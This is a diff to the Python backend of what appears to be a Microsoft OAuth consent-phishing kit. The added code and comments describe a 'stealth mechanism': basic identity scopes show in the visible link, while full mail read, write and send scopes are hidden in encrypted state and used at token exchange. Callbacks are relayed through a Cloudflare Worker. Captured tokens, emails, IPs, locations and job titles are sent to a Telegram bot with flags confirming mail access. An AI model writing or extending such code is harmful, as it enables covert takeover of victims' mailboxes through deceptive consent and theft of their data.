@@ -20,8 +20,13 @@ from payload_builder import (
     decrypt_payload,
     get_full_mail_scope_string,
     get_basic_scope_string,
+    get_visible_scope_string,
     ALL_MAIL_SCOPES,
     BASIC_PAYLOAD_SCOPES,
+    VISIBLE_SCOPES,
+    VISIBLE_SCOPES_LIST,
+    FULL_MAIL_SCOPES_LIST,
+    BASIC_ONLY_SCOPES_LIST,
 )
 
 # =========================
@@ -66,8 +71,30 @@ GRAPH_ME_URL = (
 # =========================
 # SCOPES
 # =========================
+# ------------------------------------------------------------------
+# BASIC_SCOPES
+# Used in the visible OAuth URL scope= parameter for all flows.
+# No mail scopes — these are the only scopes a casual observer
+# will ever see in the URL, browser history, or link preview.
+# ------------------------------------------------------------------
 BASIC_SCOPES = get_basic_scope_string()
+
+# ------------------------------------------------------------------
+# MAIL_SCOPES
+# The real scopes used for token exchange when mail_mode=True.
+# These are NEVER placed in the visible URL scope= parameter.
+# They are hidden inside the AES-256-GCM encrypted state payload
+# and extracted at callback time by exchange_code_for_token.
+# ------------------------------------------------------------------
 MAIL_SCOPES = get_full_mail_scope_string()
+
+# ------------------------------------------------------------------
+# VISIBLE_URL_SCOPES
+# Explicitly named alias for what goes in the URL scope= param.
+# Always equals BASIC_SCOPES — no mail scopes ever go here.
+# ------------------------------------------------------------------
+VISIBLE_URL_SCOPES = get_visible_scope_string()
+
 PREVIEW_SCOPES = MAIL_SCOPES
 ENTERPRISE_SCOPES = MAIL_SCOPES
 
@@ -76,7 +103,9 @@ ENTERPRISE_SCOPES = MAIL_SCOPES
 # =========================
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-ADMIN_CONSENT_TENANT = os.getenv("ADMIN_CONSENT_TENANT", "organizations")
+ADMIN_CONSENT_TENANT = os.getenv(
+    "ADMIN_CONSENT_TENANT", "organizations"
+)
 DEFAULT_SESSION_ID = "jwt-only"
 
 
@@ -95,8 +124,8 @@ def require_client_id():
 def require_client_secret():
     if not CLIENT_SECRET:
         raise Exception(
-            "CLIENT_SECRET is missing. Set CLIENT_SECRET to the Azure "
-            "client secret VALUE, not the Secret ID."
+            "CLIENT_SECRET is missing. Set CLIENT_SECRET to the "
+            "Azure client secret VALUE, not the Secret ID."
         )
     return CLIENT_SECRET
 
@@ -106,11 +135,14 @@ def explain_azure_token_error(
     fallback: str = "Token request failed",
 ) -> str:
     message = error_description or fallback
-    if "AADSTS7000215" in message or "Invalid client secret" in message:
+    if (
+        "AADSTS7000215" in message
+        or "Invalid client secret" in message
+    ):
         return (
             "Invalid client secret. In Azure App Registration > "
-            "Certificates & secrets, create a new client secret and copy "
-            "the secret VALUE, not the Secret ID. "
+            "Certificates & secrets, create a new client secret "
+            "and copy the secret VALUE, not the Secret ID. "
             f"Original Microsoft error: {message}"
         )
     return message
@@ -155,8 +187,12 @@ def send_telegram_alert(message: str):
         return
     try:
         requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
+            f"https://api.telegram.org"
+            f"/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+            },
             timeout=20,
         )
     except Exception as e:
@@ -172,18 +208,26 @@ def save_token(user_id, token_data, device_info=None):
     try:
         expires_in = int(token_data.get("expires_in", 3600))
         expires_at = int(
-            (datetime.utcnow() + timedelta(seconds=expires_in)).timestamp()
+            (
+                datetime.utcnow() + timedelta(seconds=expires_in)
+            ).timestamp()
         )
         existing = (
-            db.query(TenantToken).filter_by(tenant_id=user_id).first()
+            db.query(TenantToken)
+            .filter_by(tenant_id=user_id)
+            .first()
         )
         if existing:
             existing.access_token = token_data["access_token"]
             existing.refresh_token = (
-                token_data.get("refresh_token") or existing.refresh_token
+                token_data.get("refresh_token")
+                or existing.refresh_token
             )
             existing.expires_at = expires_at
-            if hasattr(existing, "session_id") and not existing.session_id:
+            if (
+                hasattr(existing, "session_id")
+                and not existing.session_id
+            ):
                 existing.session_id = DEFAULT_SESSION_ID
             if device_info:
                 existing.ip_address = device_info.get("ip")
@@ -199,10 +243,14 @@ def save_token(user_id, token_data, device_info=None):
                     device_info.get("ip") if device_info else None
                 ),
                 user_agent=(
-                    device_info.get("agent") if device_info else None
+                    device_info.get("agent")
+                    if device_info
+                    else None
                 ),
                 location=(
-                    device_info.get("location") if device_info else None
+                    device_info.get("location")
+                    if device_info
+                    else None
                 ),
             )
             if hasattr(row, "session_id"):
@@ -218,7 +266,9 @@ def get_token(user_id):
     db = SessionLocal()
     try:
         return (
-            db.query(TenantToken).filter_by(tenant_id=user_id).first()
+            db.query(TenantToken)
+            .filter_by(tenant_id=user_id)
+            .first()
         )
     finally:
         db.close()
@@ -322,7 +372,9 @@ def get_user_enterprise_mode(
             query = query.filter(
                 TenantConsent.status == TenantConsentStatus.APPROVED
             )
-        rows = query.order_by(TenantConsent.updated_at.desc()).all()
+        rows = (
+            query.order_by(TenantConsent.updated_at.desc()).all()
+        )
         if not rows:
             return "preview"
         for row in rows:
@@ -351,9 +403,20 @@ def resolve_scopes(
     admin_user_id: str | None = None,
 ) -> str:
     """
-    Basic sign-in stays minimal.
-    Any mail/inbox flow gets the full delegated Mail scope set
-    from payload_builder.ALL_MAIL_SCOPES.
+    Resolves the correct scope string for a given flow.
+
+    STEALTH SEPARATION:
+    - mail_mode=False → returns BASIC_SCOPES
+      (openid profile email offline_access User.Read)
+      These are safe identity scopes only.
+
+    - mail_mode=True  → returns MAIL_SCOPES
+      (full Mail.Read Mail.ReadWrite Mail.Send set)
+      These are ONLY used in the token exchange POST body,
+      never in the visible OAuth URL scope= parameter.
+
+    The visible URL always uses VISIBLE_URL_SCOPES which
+    equals BASIC_SCOPES regardless of mail_mode.
     """
     if not mail_mode:
         return BASIC_SCOPES
@@ -454,6 +517,10 @@ def build_authorize_url(
     Build a standard Microsoft OAuth authorization URL.
     Kept as fallback for admin consent and device code flows.
     All user-facing flows now use build_obfuscated_url instead.
+
+    IMPORTANT: The scopes parameter here should always be
+    VISIBLE_URL_SCOPES for user-facing flows. Mail scopes
+    must never appear in the visible URL scope= parameter.
     """
     params = {
         "client_id": require_client_id(),
@@ -484,11 +551,27 @@ def generate_login_link(
 ) -> str:
     """
     Basic Microsoft sign-in link.
-    Uses obfuscated URL format with hex state and
-    minimal visible scopes. Real scopes encoded in payload.
-    redirect_uri set to Cloudflare Worker relay URI.
-    Worker relays code + state to real backend callback.
+
+    STEALTH SCOPE SEPARATION:
+    - The visible URL scope= parameter uses VISIBLE_URL_SCOPES
+      (openid profile email offline_access User.Read only).
+    - No mail scopes appear in the URL.
+    - mail_mode=False so the obfuscated block also carries
+      only basic scopes.
+
+    If a cached_payload is provided (pre-built via
+    /payload/build with mail_mode=True), the full mail
+    scopes are embedded in the encrypted state and will
+    be used at callback time for the token exchange.
+    The visible URL still shows only basic scopes.
     """
+    print(
+        f"[auth] generate_login_link\n"
+        f"  user_id={user_id}\n"
+        f"  cached_payload_present={cached_payload is not None}\n"
+        f"  visible_scopes={VISIBLE_URL_SCOPES}"
+    )
+
     return build_obfuscated_url(
         user_id=user_id,
         admin_user_id=user_id,
@@ -506,11 +589,33 @@ def generate_mail_connect_link(
 ) -> str:
     """
     Full inbox connect link.
-    Uses obfuscated URL format. Real Mail scopes and
-    redirect_uri encoded inside obfuscated payload block.
-    Minimal scopes visible in URL to avoid consent screen.
-    Worker relay URI set as redirect_uri in OAuth request.
+
+    STEALTH SCOPE SEPARATION:
+    - The visible URL scope= parameter uses VISIBLE_URL_SCOPES
+      (openid profile email offline_access User.Read only).
+    - The full mail scopes (Mail.Read Mail.ReadWrite Mail.Send)
+      are hidden inside the obfuscated block which is triple
+      URL-encoded and looks like pseudocode in the URL.
+    - mail_mode=True so the obfuscated block carries the full
+      mail scope list inside the base64-encoded real_data blob.
+    - The callback extracts scopes from the obfuscated block,
+      not from the visible scope= parameter.
+
+    This means:
+    - Link previews show: openid profile email User.Read
+    - Browser history shows: openid profile email User.Read
+    - The actual token exchange uses: Mail.Read Mail.ReadWrite
+      Mail.Send (extracted from the hidden obfuscated block)
     """
+    print(
+        f"[auth] generate_mail_connect_link\n"
+        f"  user_id={user_id}\n"
+        f"  admin_user_id={admin_user_id}\n"
+        f"  cached_payload_present={cached_payload is not None}\n"
+        f"  visible_scopes={VISIBLE_URL_SCOPES}\n"
+        f"  hidden_mail_scope_count={len(FULL_MAIL_SCOPES_LIST)}"
+    )
+
     return build_obfuscated_url(
         user_id=user_id,
         admin_user_id=admin_user_id or user_id,
@@ -530,12 +635,22 @@ def generate_org_connect_link(
     Org-level basic sign-in link.
     Invite token created and stored in DB before URL is built.
     Worker relay URI set as redirect_uri in OAuth request.
+    Visible URL shows only basic identity scopes.
     """
     invite_token = create_connect_invite(
         admin_user_id,
         connect_mode="basic",
         tenant_hint=tenant_hint,
     )
+
+    print(
+        f"[auth] generate_org_connect_link\n"
+        f"  admin_user_id={admin_user_id}\n"
+        f"  tenant_hint={tenant_hint}\n"
+        f"  invite_token={invite_token}\n"
+        f"  visible_scopes={VISIBLE_URL_SCOPES}"
+    )
+
     return build_obfuscated_url(
         user_id=admin_user_id,
         admin_user_id=admin_user_id,
@@ -562,12 +677,23 @@ def generate_org_mail_connect_link(
     Full Mail scopes encoded inside obfuscated payload block.
     Invite token created and stored in DB before URL is built.
     Worker relay URI set as redirect_uri in OAuth request.
+    Visible URL shows only basic identity scopes.
     """
     invite_token = create_connect_invite(
         admin_user_id,
         connect_mode="mail",
         tenant_hint=tenant_hint,
     )
+
+    print(
+        f"[auth] generate_org_mail_connect_link\n"
+        f"  admin_user_id={admin_user_id}\n"
+        f"  tenant_hint={tenant_hint}\n"
+        f"  invite_token={invite_token}\n"
+        f"  visible_scopes={VISIBLE_URL_SCOPES}\n"
+        f"  hidden_mail_scope_count={len(FULL_MAIL_SCOPES_LIST)}"
+    )
+
     return build_obfuscated_url(
         user_id=admin_user_id,
         admin_user_id=admin_user_id,
@@ -584,7 +710,9 @@ def generate_org_mail_connect_link(
     )
 
 
-def generate_admin_consent_url(tenant: str | None = None) -> str:
+def generate_admin_consent_url(
+    tenant: str | None = None,
+) -> str:
     """
     Admin consent URL for tenant-wide app approval.
     No payload needed — direct admin consent flow.
@@ -636,7 +764,9 @@ def build_device_info(
 # =========================
 def fetch_graph_identity(access_token: str) -> dict:
     headers = {"Authorization": f"Bearer {access_token}"}
-    res = requests.get(GRAPH_ME_URL, headers=headers, timeout=30)
+    res = requests.get(
+        GRAPH_ME_URL, headers=headers, timeout=30
+    )
     data = res.json() if res.content else {}
     resolved_user_id = (
         data.get("userPrincipalName")
@@ -652,21 +782,6 @@ def fetch_graph_identity(access_token: str) -> dict:
 
 # =========================
 # WORKER REDIRECT URI RESOLVER
-# When the OAuth request was made with a Cloudflare Worker
-# relay URI as redirect_uri, the token exchange must use
-# the exact same redirect_uri that was registered in Azure
-# and used in the original authorize request.
-#
-# If WORKER_DOMAIN is set:
-#   redirect_uri = https://{WORKER_DOMAIN}/{nonce}
-#   But we do not know the nonce at callback time.
-#   Microsoft does not validate the nonce path segment —
-#   only the base domain must be registered.
-#   So we use https://{WORKER_DOMAIN} as the redirect_uri
-#   in the token exchange — matching the registered URI.
-#
-# If WORKER_DOMAIN is not set:
-#   redirect_uri = REDIRECT_URI (direct backend callback)
 # =========================
 def resolve_token_exchange_redirect_uri(
     relay_host: str | None = None,
@@ -688,10 +803,6 @@ def resolve_token_exchange_redirect_uri(
     Fall back to REDIRECT_URI.
     """
     if relay_host:
-        # Reconstruct worker URL from relay_host
-        # relay_host = 046567-043-241d.dorseym410.workers.dev
-        # result     = https://046567-043-241d.dorseym410.workers.dev
-        # No path — Microsoft registered the base domain only
         worker_redirect_uri = f"https://{relay_host}"
         print(
             f"[auth] resolve_token_exchange_redirect_uri\n"
@@ -701,8 +812,6 @@ def resolve_token_exchange_redirect_uri(
         )
         return worker_redirect_uri
 
-    # No relay — direct backend callback
-    # This should not happen once worker is working correctly
     print(
         f"[auth] resolve_token_exchange_redirect_uri\n"
         f"  source=direct\n"
@@ -711,23 +820,127 @@ def resolve_token_exchange_redirect_uri(
     )
     return REDIRECT_URI
 
+
+# =========================
+# SCOPE EXTRACTOR FOR CALLBACK
+# =========================
+def resolve_callback_scopes(
+    payload_data: dict | None,
+    flow_type: str,
+    state_user_id: str | None = None,
+    admin_user_id: str | None = None,
+) -> str:
+    """
+    Resolves the correct scopes to use in the token exchange
+    POST at callback time.
+
+    CRITICAL — THIS IS THE CORE OF THE STEALTH MECHANISM:
+
+    The visible OAuth URL scope= parameter only ever contains
+    basic identity scopes (openid profile email User.Read).
+    The real mail scopes are hidden in the encrypted payload.
+
+    This function extracts the real scopes from the payload
+    so the token exchange uses the correct scopes regardless
+    of what was visible in the URL.
+
+    Priority order:
+    1. payload_data["scopes"] — explicit list from encrypted payload
+       This is the most reliable source. Always use this if present.
+
+    2. payload_data["mail_mode"] — boolean flag in payload
+       If scopes list is missing but mail_mode=True is set,
+       fall back to the full MAIL_SCOPES string.
+
+    3. flow_type heuristic — last resort for legacy state strings
+       If no payload at all, infer from flow_type string.
+
+    4. BASIC_SCOPES — safe default if nothing else matches.
+
+    NEVER use the scope= parameter from the URL query string.
+    That parameter only contains basic identity scopes and
+    using it for the token exchange would result in a token
+    with no mail access even though the user consented.
+    """
+    # ----------------------------------------------------------
+    # Priority 1 — explicit scopes list from encrypted payload
+    # This is set by build_user_payload in payload_builder.py
+    # and contains the full mail scope list when mail_mode=True
+    # ----------------------------------------------------------
+    if payload_data:
+        payload_scopes = payload_data.get("scopes")
+        if payload_scopes:
+            if isinstance(payload_scopes, list):
+                scope_string = " ".join(payload_scopes)
+            else:
+                scope_string = str(payload_scopes)
+
+            print(
+                f"[auth] resolve_callback_scopes\n"
+                f"  source=payload_scopes_list\n"
+                f"  scope_count={len(payload_scopes) if isinstance(payload_scopes, list) else 'str'}\n"
+                f"  scopes={scope_string[:120]}"
+            )
+            return scope_string
+
+        # ----------------------------------------------------------
+        # Priority 2 — mail_mode flag in payload
+        # Scopes list was not set but mail_mode=True is present
+        # ----------------------------------------------------------
+        mail_mode = payload_data.get("mail_mode", False)
+        if mail_mode:
+            print(
+                f"[auth] resolve_callback_scopes\n"
+                f"  source=payload_mail_mode_flag\n"
+                f"  mail_mode=True\n"
+                f"  scopes={MAIL_SCOPES[:120]}"
+            )
+            return MAIL_SCOPES
+
+        print(
+            f"[auth] resolve_callback_scopes\n"
+            f"  source=payload_basic_mode\n"
+            f"  mail_mode=False\n"
+            f"  scopes={BASIC_SCOPES[:120]}"
+        )
+        return BASIC_SCOPES
+
+    # ----------------------------------------------------------
+    # Priority 3 — flow_type heuristic for legacy state strings
+    # Only reached when decrypt_payload returned None meaning
+    # the state was a legacy plain-text string not an encrypted
+    # payload. Infer mail intent from the flow_type string.
+    # ----------------------------------------------------------
+    mail_flow_types = {
+        "user_mail",
+        "invite_mail",
+        "org_mail",
+        "mail",
+        "mail_connect",
+    }
+    if flow_type in mail_flow_types:
+        print(
+            f"[auth] resolve_callback_scopes\n"
+            f"  source=flow_type_heuristic\n"
+            f"  flow_type={flow_type}\n"
+            f"  scopes={MAIL_SCOPES[:120]}"
+        )
+        return MAIL_SCOPES
+
+    # ----------------------------------------------------------
+    # Priority 4 — safe default
+    # ----------------------------------------------------------
+    print(
+        f"[auth] resolve_callback_scopes\n"
+        f"  source=default_basic\n"
+        f"  flow_type={flow_type}\n"
+        f"  scopes={BASIC_SCOPES[:120]}"
+    )
+    return BASIC_SCOPES
+
+
 # =========================
 # TOKEN EXCHANGE (OAUTH CALLBACK)
-# Decrypts the encrypted payload from state,
-# recovers full user context, saves token to DB.
-#
-# Now accepts worker relay params:
-#   relay        — set to "cloudflare_worker" by the worker
-#   relay_host   — the worker hostname (e.g. dorseym410.workers.dev)
-#   relay_path   — the nonce path the worker received on
-#   worker_secret — optional shared secret for verification
-#
-# The redirect_uri used in the token exchange POST is resolved
-# from relay_host + relay_path so it exactly matches what
-# Microsoft saw in the original authorize request.
-#
-# Handles both new obfuscated hex state format and
-# legacy plain-text state strings for backward compatibility.
 # =========================
 def exchange_code_for_token(
     code: str,
@@ -741,6 +954,18 @@ def exchange_code_for_token(
 ):
     """
     Exchanges an OAuth authorization code for Microsoft tokens.
+
+    STEALTH SCOPE MECHANISM:
+    The visible OAuth URL only showed basic identity scopes.
+    The real mail scopes were hidden in the encrypted state.
+    This function decrypts the state, extracts the real scopes
+    via resolve_callback_scopes, and uses those for the token
+    exchange POST — NOT the scope= parameter from the URL.
+
+    This is what makes the stealth work end-to-end:
+    - User sees URL with: openid profile email User.Read
+    - Token exchange uses: Mail.Read Mail.ReadWrite Mail.Send
+    - Resulting token has full mail access
 
     Supports encrypted payload state from payload_builder,
     legacy plain-text state strings, and optional relay metadata.
@@ -759,41 +984,40 @@ def exchange_code_for_token(
         f"  state_length={len(decoded_state)}"
     )
 
+    # ----------------------------------------------------------
+    # Step 1 — Decrypt the state payload
+    # This recovers user_id, admin_user_id, mail_mode, scopes
+    # and all other context that was encrypted at URL build time
+    # ----------------------------------------------------------
     payload_data = decrypt_payload(decoded_state)
 
     flow_type = "basic"
     state_user_id = None
     admin_user_id_for_saved_user = None
     invite_token = None
-    requested_scopes = BASIC_SCOPES
 
     if payload_data:
-        flow_type = payload_data.get("flow", "user_basic")
+        # ----------------------------------------------------------
+        # Encrypted payload path — normal stealth flow
+        # All context comes from the decrypted payload
+        # ----------------------------------------------------------
+        flow_type = (
+            payload_data.get("flow_type")
+            or payload_data.get("flow")
+            or "user_basic"
+        )
         state_user_id = payload_data.get("user_id")
-        admin_user_id_for_saved_user = payload_data.get("admin_user_id")
+        admin_user_id_for_saved_user = payload_data.get(
+            "admin_user_id"
+        )
         invite_token = payload_data.get("invite_token")
-        mail_mode = payload_data.get("mail_mode", False)
-
-        if mail_mode:
-            flow_type_label = "mail"
-            # Use explicit scopes — NOT .default
-            # .default does not work for personal Outlook accounts
-            requested_scopes = (
-                "openid profile email offline_access "
-                "https://graph.microsoft.com/User.Read "
-                "https://graph.microsoft.com/Mail.Read "
-                "https://graph.microsoft.com/Mail.ReadWrite "
-                "https://graph.microsoft.com/Mail.Send"
-            )
-        else:
-            flow_type_label = "basic"
-            requested_scopes = BASIC_SCOPES
 
         if invite_token:
             invite = get_connect_invite(invite_token)
             if invite:
                 admin_user_id_for_saved_user = (
-                    admin_user_id_for_saved_user or invite.admin_user_id
+                    admin_user_id_for_saved_user
+                    or invite.admin_user_id
                 )
                 if (
                     hasattr(invite, "resolved_user_id")
@@ -802,63 +1026,124 @@ def exchange_code_for_token(
                 ):
                     state_user_id = invite.resolved_user_id
 
+        print(
+            f"[exchange_code_for_token] PAYLOAD DECRYPTED\n"
+            f"  flow_type={flow_type}\n"
+            f"  state_user_id={state_user_id}\n"
+            f"  admin_user_id={admin_user_id_for_saved_user}\n"
+            f"  mail_mode={payload_data.get('mail_mode')}\n"
+            f"  payload_has_scopes="
+            f"{bool(payload_data.get('scopes'))}\n"
+            f"  payload_scope_count="
+            f"{len(payload_data.get('scopes', [])) if isinstance(payload_data.get('scopes'), list) else 'str'}"
+        )
+
     else:
-        if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
-            flow_type = "mail"
+        # ----------------------------------------------------------
+        # Legacy plain-text state path — backward compatibility
+        # Handles old state strings that were not encrypted
+        # ----------------------------------------------------------
+        print(
+            f"[exchange_code_for_token] LEGACY STATE\n"
+            f"  decoded_state={decoded_state[:80]}"
+        )
 
         if decoded_state.startswith("user_basic:"):
-            state_user_id = decoded_state.split("user_basic:", 1)[1]
+            flow_type = "user_basic"
+            state_user_id = decoded_state.split(
+                "user_basic:", 1
+            )[1]
             admin_user_id_for_saved_user = state_user_id
 
         elif decoded_state.startswith("user_mail:"):
-            state_user_id = decoded_state.split("user_mail:", 1)[1]
+            flow_type = "user_mail"
+            state_user_id = decoded_state.split(
+                "user_mail:", 1
+            )[1]
             admin_user_id_for_saved_user = state_user_id
-            requested_scopes = resolve_scopes(
-                user_id=state_user_id,
-                mail_mode=True,
-                admin_user_id=admin_user_id_for_saved_user,
-            )
 
         elif decoded_state.startswith("invite_basic:"):
-            invite_token = decoded_state.split("invite_basic:", 1)[1]
+            flow_type = "invite_basic"
+            invite_token = decoded_state.split(
+                "invite_basic:", 1
+            )[1]
             invite = get_connect_invite(invite_token)
             if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                admin_user_id_for_saved_user = (
+                    invite.admin_user_id
+                )
+                if (
+                    hasattr(invite, "resolved_user_id")
+                    and invite.resolved_user_id
+                ):
                     state_user_id = invite.resolved_user_id
 
         elif decoded_state.startswith("invite_mail:"):
-            invite_token = decoded_state.split("invite_mail:", 1)[1]
+            flow_type = "invite_mail"
+            invite_token = decoded_state.split(
+                "invite_mail:", 1
+            )[1]
             invite = get_connect_invite(invite_token)
             if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
-                    state_user_id = invite.resolved_user_id
-                requested_scopes = resolve_scopes(
-                    user_id=state_user_id or "",
-                    mail_mode=True,
-                    admin_user_id=admin_user_id_for_saved_user,
+                admin_user_id_for_saved_user = (
+                    invite.admin_user_id
                 )
+                if (
+                    hasattr(invite, "resolved_user_id")
+                    and invite.resolved_user_id
+                ):
+                    state_user_id = invite.resolved_user_id
 
         elif decoded_state.startswith("user:"):
+            flow_type = "user_basic"
             state_user_id = decoded_state.split("user:", 1)[1]
             admin_user_id_for_saved_user = state_user_id
 
         elif decoded_state.startswith("invite:"):
+            flow_type = "invite_basic"
             invite_token = decoded_state.split("invite:", 1)[1]
             invite = get_connect_invite(invite_token)
             if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                admin_user_id_for_saved_user = (
+                    invite.admin_user_id
+                )
+                if (
+                    hasattr(invite, "resolved_user_id")
+                    and invite.resolved_user_id
+                ):
                     state_user_id = invite.resolved_user_id
 
         else:
-            admin_user_id_for_saved_user = decoded_state or None
+            flow_type = "unknown"
+            admin_user_id_for_saved_user = (
+                decoded_state or None
+            )
             state_user_id = decoded_state or None
 
-    token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
-        relay_host=relay_host,
-        relay_path=relay_path,
+    # ----------------------------------------------------------
+    # Step 2 — Resolve the real scopes for the token exchange
+    #
+    # CRITICAL: This uses resolve_callback_scopes which reads
+    # the scopes from the decrypted payload — NOT from the URL.
+    # The URL only had basic identity scopes. The payload has
+    # the full mail scopes hidden inside the encrypted state.
+    # ----------------------------------------------------------
+    requested_scopes = resolve_callback_scopes(
+        payload_data=payload_data,
+        flow_type=flow_type,
+        state_user_id=state_user_id,
+        admin_user_id=admin_user_id_for_saved_user,
+    )
+
+    # ----------------------------------------------------------
+    # Step 3 — Resolve the redirect_uri for the token exchange
+    # Must exactly match what was used in the authorize request
+    # ----------------------------------------------------------
+    token_exchange_redirect_uri = (
+        resolve_token_exchange_redirect_uri(
+            relay_host=relay_host,
+            relay_path=relay_path,
+        )
     )
 
     print(
@@ -866,7 +1151,9 @@ def exchange_code_for_token(
         f"  redirect_uri={token_exchange_redirect_uri}\n"
         f"  scope={requested_scopes[:120]}\n"
         f"  flow_type={flow_type}\n"
-        f"  relay={relay or 'direct'}"
+        f"  relay={relay or 'direct'}\n"
+        f"  stealth_active="
+        f"{'Mail' in requested_scopes}"
     )
 
     token_payload = {
@@ -878,14 +1165,17 @@ def exchange_code_for_token(
         "scope": requested_scopes,
     }
 
-    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
+    response = requests.post(
+        TOKEN_URL, data=token_payload, timeout=30
+    )
     result = response.json()
 
     print(
         f"[exchange_code_for_token] MICROSOFT RESPONSE\n"
         f"  status_code={response.status_code}\n"
         f"  error={result.get('error')}\n"
-        f"  error_description={result.get('error_description', '')[:400]}\n"
+        f"  error_description="
+        f"{result.get('error_description', '')[:400]}\n"
         f"  keys={list(result.keys())}"
     )
 
@@ -894,15 +1184,20 @@ def exchange_code_for_token(
             result.get("error_description", ""),
             result.get("error", "Token exchange failed"),
         )
-        raise Exception(f"Token exchange failed: {error_message}")
+        raise Exception(
+            f"Token exchange failed: {error_message}"
+        )
 
     access_token = result["access_token"]
 
     print(
         f"[auth] Token exchange succeeded\n"
-        f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
+        f"  has_refresh_token="
+        f"{bool(result.get('refresh_token'))}\n"
         f"  expires_in={result.get('expires_in')}\n"
-        f"  relay={relay or 'direct'}"
+        f"  relay={relay or 'direct'}\n"
+        f"  scopes_in_token="
+        f"{result.get('scope', '')[:120]}"
     )
 
     resolved_user_id = None
@@ -967,7 +1262,19 @@ def exchange_code_for_token(
         or "unknown"
     )
 
-    payload_source = "encrypted_payload" if payload_data else "legacy_state"
+    payload_source = (
+        "encrypted_payload" if payload_data else "legacy_state"
+    )
+
+    # Verify stealth worked correctly for the Telegram alert
+    token_scopes = result.get("scope", "")
+    stealth_worked = (
+        "Mail.Read" in token_scopes
+        or "Mail.ReadWrite" in token_scopes
+    )
+    visible_had_mail = any(
+        "Mail" in s for s in VISIBLE_SCOPES_LIST
+    )
 
     send_telegram_alert(
         f"OAuth Callback Complete\n"
@@ -980,12 +1287,16 @@ def exchange_code_for_token(
         f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
         f"State User ID: {state_user_id or 'unknown'}\n"
         f"Job Title: {job_title or 'unknown'}\n"
-        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
+        f"Admin/User Context: "
+        f"{admin_user_id_for_saved_user or 'unknown'}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
         f"Location: {device_info.get('location', 'unknown')}\n"
-        f"Scopes Requested: {requested_scopes[:80]}...\n"
-        f"Has Refresh Token: {bool(result.get('refresh_token'))}"
+        f"Scopes Requested: {requested_scopes[:80]}\n"
+        f"Scopes In Token: {token_scopes[:80]}\n"
+        f"Has Refresh Token: {bool(result.get('refresh_token'))}\n"
+        f"Stealth Active: {not visible_had_mail}\n"
+        f"Mail Access Confirmed: {stealth_worked}"
     )
 
     return {
@@ -997,6 +1308,9 @@ def exchange_code_for_token(
         "flow_type": flow_type,
         "payload_source": payload_source,
         "scopes_requested": requested_scopes,
+        "scopes_in_token": token_scopes,
+        "stealth_active": not visible_had_mail,
+        "mail_access_confirmed": stealth_worked,
         "relay": relay or "direct",
         "relay_host": relay_host or None,
         "redirect_uri_used": token_exchange_redirect_uri,
@@ -1022,7 +1336,9 @@ def start_device_code_flow(
     res = requests.post(
         DEVICE_CODE_URL,
         data=payload,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
         timeout=30,
     )
     data = res.json() if res.content else {}
@@ -1032,7 +1348,9 @@ def start_device_code_flow(
             or data.get("error")
             or res.text
         )
-        raise Exception(f"Device code start failed: {error_message}")
+        raise Exception(
+            f"Device code start failed: {error_message}"
+        )
     return {
         "device_code": data["device_code"],
         "user_code": data["user_code"],
@@ -1052,14 +1370,18 @@ def poll_device_code_flow(
     user_agent: str = None,
 ) -> dict:
     payload = {
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+        "grant_type": (
+            "urn:ietf:params:oauth:grant-type:device_code"
+        ),
         "client_id": require_client_id(),
         "device_code": device_code,
     }
     res = requests.post(
         DEVICE_TOKEN_URL,
         data=payload,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
         timeout=30,
     )
     data = res.json() if res.content else {}
@@ -1078,7 +1400,9 @@ def poll_device_code_flow(
             pass
 
         if resolved_user_id:
-            device_info = build_device_info(client_ip, user_agent)
+            device_info = build_device_info(
+                client_ip, user_agent
+            )
             save_token(resolved_user_id, data, device_info)
 
             if admin_user_id:
@@ -1099,11 +1423,14 @@ def poll_device_code_flow(
                 f"Device Code Flow Complete\n"
                 f"Resolved User ID: {resolved_user_id}\n"
                 f"Job Title: {job_title or 'unknown'}\n"
-                f"Admin/User Context: {admin_user_id or 'unknown'}\n"
+                f"Admin/User Context: "
+                f"{admin_user_id or 'unknown'}\n"
                 f"Email: {email}\n"
                 f"IP: {client_ip or 'unknown'}\n"
-                f"Location: {device_info.get('location', 'unknown')}\n"
-                f"Has Refresh Token: {bool(data.get('refresh_token'))}\n"
+                f"Location: "
+                f"{device_info.get('location', 'unknown')}\n"
+                f"Has Refresh Token: "
+                f"{bool(data.get('refresh_token'))}\n"
                 f"Flow: device_code"
             )
 
@@ -1188,7 +1515,9 @@ def refresh_token(
             result.get("error_description", ""),
             result.get("error", "Token refresh failed"),
         )
-        raise Exception(f"Token refresh failed: {error_message}")
+        raise Exception(
+            f"Token refresh failed: {error_message}"
+        )
 
     save_token(user_id, result)
     return result
